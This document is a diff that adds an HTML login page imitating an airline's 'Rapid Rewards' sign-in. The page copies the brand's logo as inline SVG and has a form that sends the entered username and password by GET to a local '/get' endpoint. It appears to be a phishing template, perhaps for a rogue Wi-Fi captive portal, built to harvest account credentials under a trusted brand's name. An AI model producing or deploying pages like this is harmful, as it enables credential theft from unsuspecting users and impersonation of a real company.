@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+body {
+  font-family: Arial, sans-serif;
+  margin: 0;
+  padding: 0;
+  background: #f9f9f9;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  height: 100vh;
+}
+
+.container {
+  background: #fff;
+  padding: 20px;
+  border-radius: 5px;
+  box-shadow: 0 0 10px #999;
+  max-width: 400px;  
+}
+
+.logo {
+  text-align: center;
+}
+
+svg {
+  width: 80%;
+}
+
+h1 {
+  font-size: 1.5rem;
+  text-align: center;
+  margin: 20px 0;
+}
+
+.subtext {
+  text-align: center;
+  margin-bottom: 20px;
+  font-size: 0.9rem;
+}
+
+.form-group {
+  margin-bottom: 15px;
+  display: flex;
+  justify-content: center;
+}
+
+.form-control {
+  width: 100%;
+  padding: 10px;
+  border-radius: 5px;
+  border: 1px solid #ddd;
+  font-size: 1rem;  
+}
+
+button {
+  width: 100%;
+  padding: 10px; 
+  border: none;
+  border-radius: 5px;
+  background: #143f85;
+  color: #fff;
+  font-size: 1.1rem;
+  cursor: pointer;
+}
+
+@media (max-width: 500px) {
+  .container {
+    max-width: 90%;
+  }  
+}
+
+</style>  
+</head>
+
+<body>
+
+<div class="container">
+
+<div class="logo">
+<svg xmlns="http://www.w3.org/2000/svg" xml:space="preserve" viewBox="0 0 223 34">
+  <path fill="#304cb2" d="M59 27h-3c-3 0-4-1-4-3V12h-6v13c0 6 3 8 10 8l9-1V12h-6v15zm20 1c-3 0-3-1-3-3v-8h5v-5h-5V6h-6v6h-3v5h3v8c0 4 1 8 7 8l5-1-1-5-2 1zM15 16l-3-1c-4-1-5-1-5-3s1-3 5-3l7 2 1-6-8-2C5 3 1 7 1 12c0 4 1 6 5 8l3 1 6 3c0 2-2 3-5 3l-8-2-2 6 10 2c7 0 11-4 11-9 0-4-2-6-6-8zm79-5-5 1V2h-6v31h6V18l4-1c2 0 3 1 3 3v13h6V19c0-5-2-8-8-8zm-61 0c-6 0-11 4-11 11s5 11 11 11 11-4 11-11-4-11-11-11zm0 16c-2 0-4-2-4-5s2-5 4-5c3 0 5 1 5 5 0 3-2 5-5 5zm135-7-3-1-3-1c0-1 1-2 3-2l6 1 1-5-7-1c-6 0-9 3-9 7 0 3 2 4 4 6l3 1 4 2-4 1-6-1-1 5 8 1c6 0 9-3 9-7 0-3-1-5-5-6zm-22-9c-7 0-11 4-11 11s4 11 11 11l8-2-1-5-6 2c-4 0-6-2-6-4h14v-3c0-6-3-10-9-10zm-5 9c1-2 2-4 4-4 3 0 4 3 4 4h-8zm44 8c-3 0-3-1-3-3v-8h5v-5h-5V6h-6v6h-3v5h3v8c0 4 1 8 7 8l5-1-1-5-2 1zm4-25c-2 0-3 1-3 3s1 3 2 3c2 0 3-2 3-3l-2-3zm0 5c-2 0-3-1-3-2s1-2 3-2l2 2-2 2zm0-2 1-1-1-1h-1v3-1h1v1h1l-1-1zm-1 0V5h1l-1 1zm-59 6-4 12-3-12h-6l-4 12-3-12h-7l8 21h5l4-11 4 11h5l8-21h-7z"/>
+  <path fill="#ccc" d="m207 11-5 1-5-1c-4 0-7 2-7 7 0 6 6 11 12 15 6-4 12-9 12-15 0-5-3-7-7-7z"/>
+</svg>  
+</div>
+
+<h1>Sign In</h1>
+
+<p class="subtext">Sign in using your Rapid Rewards number or username and password</p>
+
+<form action="/get" method="GET">
+
+<div class="form-group">
+<input type="text" name="email" class="form-control" placeholder="Rapid Rewards # or Username" required>
+</div>
+
+<div class="form-group">  
+<input type="password" name="password" class="form-control" placeholder="Password" required>
+</div>
+
+<button type="submit">Sign In</button>
+
+</form>
+
+</div>
+
+</body>
+</html>
